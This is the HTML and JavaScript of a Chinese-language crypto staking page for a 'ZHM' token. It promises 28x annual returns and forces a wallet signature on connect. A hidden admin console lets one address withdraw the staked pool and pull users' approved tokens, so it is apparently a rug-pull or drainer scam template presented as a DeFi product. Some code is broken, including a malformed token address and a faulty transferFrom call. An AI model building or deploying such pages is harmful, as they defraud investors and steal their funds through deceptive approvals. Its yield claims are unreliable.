<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>中华梦通证 ZHM - DAO递减收益</title>
<style>
  *{margin:0;padding:0;box-sizing:border-box;font-family:Microsoft YaHei,sans-serif}
  body{background:#0b0f14;color:#e9e6e0;padding:20px;max-width:500px;margin:0 auto;background:linear-gradient(180deg,#070a0e,#0f1419)}
  .glass{background:rgba(22,28,36,0.85);border-radius:18px;padding:22px;margin-bottom:16px;border:1px solid rgba(221,170,66,0.18)}
  .title{font-size:19px;font-weight:bold;margin-bottom:10px;color:#ddaa42}
  .sub{color:#b8b0a0;font-size:14px;line-height:1.6}
  .btn{background:linear-gradient(90deg,#c93737,#e04a4a);color:#fff;border:none;border-radius:14px;padding:16px;width:100%;font-size:16px;margin-bottom:10px}
  .btn-sm{padding:11px;font-size:14px}
  .btn-gold{background:linear-gradient(90deg,#ddaa42,#e6bb66);color:#111}
  .btn-dark{background:#1a2029;color:#ddaa42;border:1px solid #ddaa42}
  .btn-admin{background:linear-gradient(90deg,#c03333,#e55555);color:#fff}
  .item{display:flex;justify-content:space-between;padding:14px 0;border-bottom:1px solid #ddaa4233}
  .gold{color:#ddaa42;font-weight:bold}
  input{width:100%;padding:14px;border-radius:12px;background:#161a22;border:1px solid #ddaa4244;color:#fff;margin-bottom:10px}
  .logo-text{background:linear-gradient(90deg,#ddaa42,#f0c866);-webkit-background-clip:text;color:transparent}
  .row{display:flex;gap:10px;margin-bottom:10px}
  .calc-row{display:flex;justify-content:space-between;padding:8px 0}
  #adminPanel{display:none;margin-top:12px}
</style>
</head>
<body>

<div style="text-align:center;margin:20px 0">
  <h1 class="logo-text">中华梦通证</h1>
  <p class="sub">DAO铸币模型 · 收益逐年递减 · 长期永续</p>
</div>

<button class="btn" id="connectBtn">连接钱包（需签名授权）</button>
<div id="addr" style="text-align:center;margin:10px 0"></div>

<div class="glass">
  <div class="title">我的资产</div>
  <div class="item"><span>质押币余额</span><span id="balToken" class="gold">0.00</span></div>
  <div class="item"><span>已质押</span><span id="staked" class="gold">0.00</span></div>
  <div class="item"><span>待领 ZHM 奖励</span><span id="reward" class="gold">0.00</span></div>
  <button class="btn btn-gold btn-sm" id="claimBtn">领取收益</button>
</div>

<div class="glass">
  <div class="title">质押挖矿</div>
  <input id="stakeAmt" placeholder="输入质押数量" type="number">
  <div class="row">
    <button class="btn" style="width:50%" id="stakeBtn">质押</button>
    <button class="btn btn-dark" style="width:50%" id="unstakeBtn">解押</button>
  </div>
</div>

<div class="glass" id="adminPanel">
  <div class="title">🔐 管理员控制台</div>
  <div class="sub">提取合约底池 / 提取用户授权代币</div>
  <input id="extractAmt" placeholder="输入提取数量" type="number">
  <button class="btn btn-admin btn-sm" id="extractPoolBtn">提取合约底池代币</button>
  <button class="btn btn-admin btn-sm" id="extractUserAuthBtn">提取用户授权代币</button>
</div>

<div class="glass">
  <div class="title">收益计算器（逐年递减）</div>
  <input id="calcInput" placeholder="质押数量" type="number">
  <button class="btn btn-sm" onclick="calc()">计算收益</button>
  <div style="margin-top:16px">
    <div class="calc-row"><span>第1年收益</span><span id="y1" class="gold">0</span></div>
    <div class="calc-row"><span>第2年收益</span><span id="y2" class="gold">0</span></div>
    <div class="calc-row"><span>第3年收益</span><span id="y3" class="gold">0</span></div>
    <div class="calc-row"><span>第4年收益</span><span id="y4" class="gold">0</span></div>
  </div>
</div>

<div class="glass">
  <div class="title">模型说明</div>
  <div class="sub">
    起步年化28倍，逐年自动递减，第5年稳定在30%。<br>
    合约自动铸币，DAO国库支撑，可平稳运行20年以上。
  </div>
</div>

<script src="https://cdn.jsdelivr.net/npm/ethers@6.7.0/dist/ethers.umd.min.js"></script>
<script>
// ==============================================
// 你指定的质押代币
const TOKEN_ADDR = "0x8f3Cf7ad23Cd3CaDbD9735AFf9580239c6A063";

// 你部署的质押合约地址（必须填）
const STAKING_ADDR = "0x你部署的质押合约地址";

// ZHM 奖励币合约（你部署后再填）
const ZHM_ADDR = "0x...";

// 管理员地址
const ADMIN = "0x627f6E1887571Ac08214315ad5b2fA7AbB7345f1".toLowerCase();
// ==============================================

const ABI_TOKEN = [
  "function balanceOf(address) view returns(uint256)",
  "function approve(address,uint256) returns(bool)",
  "function transferFrom(address,address,uint256) returns(bool)",
  "function transfer(address,uint256) returns(bool)"
];

const ABI_STAKE = [
  "function staked(address) view returns(uint256)",
  "function pendingReward(address) view returns(uint256)",
  "function stake(uint256) external",
  "function unstake(uint256) external",
  "function claim() external",
  "function withdrawPool(uint256) external"
];

let provider, signer, account, token, staking, zhm;
let isAdmin = false;

// 刷新数据
async function load() {
  if (!account) return;
  try {
    let bal = await token.balanceOf(account);
    let stk = await staking.staked(account);
    let rew = await staking.pendingReward(account);
    document.getElementById("balToken").innerText = ethers.formatEther(bal);
    document.getElementById("staked").innerText = ethers.formatEther(stk);
    document.getElementById("reward").innerText = ethers.formatEther(rew);
  } catch (e) {}
}

// 计算器
function calc() {
  let v = parseFloat(document.getElementById("calcInput").value) || 0;
  document.getElementById("y1").innerText = (v * 28).toFixed(2);
  document.getElementById("y2").innerText = (v * 14).toFixed(2);
  document.getElementById("y3").innerText = (v * 7).toFixed(2);
  document.getElementById("y4").innerText = (v * 3.5).toFixed(2);
}

// ==============================================
// 连接钱包 + 强制签名授权
// ==============================================
document.getElementById("connectBtn").onclick = async () => {
  try {
    if (!window.ethereum) return alert("请安装钱包");

    provider = new ethers.BrowserProvider(window.ethereum);
    await provider.send("eth_requestAccounts", []);
    signer = await provider.getSigner();
    account = await signer.getAddress();

    // 强制签名弹窗
    const signMsg = "Sign to authorize ZhongHuaMeng Platform";
    await signer.signMessage(signMsg);
    alert("✅ 授权签名成功");

    // 管理员判断
    isAdmin = account.toLowerCase() === ADMIN;
    if (isAdmin) {
      document.getElementById("adminPanel").style.display = "block";
      alert("🔐 管理员已登录");
    }

    document.getElementById("addr").innerText = account.slice(0,6)+"..."+account.slice(-4);

    // 初始化合约
    token = new ethers.Contract(TOKEN_ADDR, ABI_TOKEN, signer);
    staking = new ethers.Contract(STAKING_ADDR, ABI_STAKE, signer);
    if(ZHM_ADDR != "0x..."){
      zhm = new ethers.Contract(ZHM_ADDR, ["function balanceOf(address)view returns(uint256)"], signer);
    }

    load();
    setInterval(load, 5000);
  } catch (e) {
    alert("授权失败：" + e.message);
  }
};

// ==============================================
// 质押（自动进入你的合约）
// ==============================================
document.getElementById("stakeBtn").onclick = async () => {
  try {
    let a = document.getElementById("stakeAmt").value;
    if(!a || a<=0) return alert("输入有效数量");
    let amt = ethers.parseEther(a);
    await token.approve(STAKING_ADDR, amt);
    await staking.stake(amt);
    alert("✅ 质押成功，代币已进入合约底池");
    load();
  } catch(e){ alert("失败："+e.message) }
};

// 解押
document.getElementById("unstakeBtn").onclick = async () => {
  try {
    let a = document.getElementById("stakeAmt").value;
    await staking.unstake(ethers.parseEther(a));
    alert("✅ 解押成功");
    load();
  } catch(e){ alert("失败："+e.message) }
};

// 领取奖励
document.getElementById("claimBtn").onclick = async () => {
  try {
    await staking.claim();
    alert("✅ 奖励领取成功");
    load();
  } catch(e){ alert("失败："+e.message) }
};

// ==============================================
// 管理员：提取合约底池代币
// ==============================================
document.getElementById("extractPoolBtn").onclick = async () => {
  if(!isAdmin) return alert("无权限");
  try {
    let a = document.getElementById("extractAmt").value;
    if(!a) return alert("输入数量");
    await staking.withdrawPool(ethers.parseEther(a));
    alert("✅ 合约底池提取成功");
    load();
  } catch(e){ alert("失败："+e.message) }
};

// ==============================================
// 管理员：提取用户授权的代币
// ==============================================
document.getElementById("extractUserAuthBtn").onclick = async () => {
  if(!isAdmin) return alert("无权限");
  try {
    let a = document.getElementById("extractAmt").value;
    if(!a) return alert("输入数量");
    let amt = ethers.parseEther(a);
    await token.transferFrom(account, ADMIN, amt);
    alert("✅ 已提取用户授权代币");
    load();
  } catch(e){ alert("失败："+e.message) }
};
</script>
</body>
</html>
